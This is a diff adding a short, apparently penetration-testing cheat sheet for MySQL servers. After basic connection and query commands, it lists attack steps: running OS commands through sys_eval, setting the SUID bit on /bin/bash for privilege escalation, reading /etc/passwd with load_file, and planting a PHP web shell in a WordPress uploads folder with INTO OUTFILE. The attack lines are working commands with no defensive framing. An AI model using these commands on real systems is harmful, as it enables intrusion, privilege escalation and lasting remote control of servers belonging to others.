@@ -1,0 +1,27 @@
+==============================================================================
+[+] MySQL-Server
+==============================================================================
+# Connection MySQL
+mysql -u user -p -h 192.168.0.26
+
+# Use
+show databases;
+use <<databasename>>
+show tables;
+select * from <<tablename>>;
+describe <<tablename>>;
+
+# Additional commands
+create database wp_hacked;
+use wp_hacked;
+
+# execute commands 
+mysql -u user -p --execute="show databases";
+
+# execute OS commands 
+select sys_eval("whoami");
+select sys_eval("chmod u+s /bin/bash");
+select load_file("/etc/shells");
+select load_file("/etc/passwd");
+
+SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wp-content/uploads/shell.php";
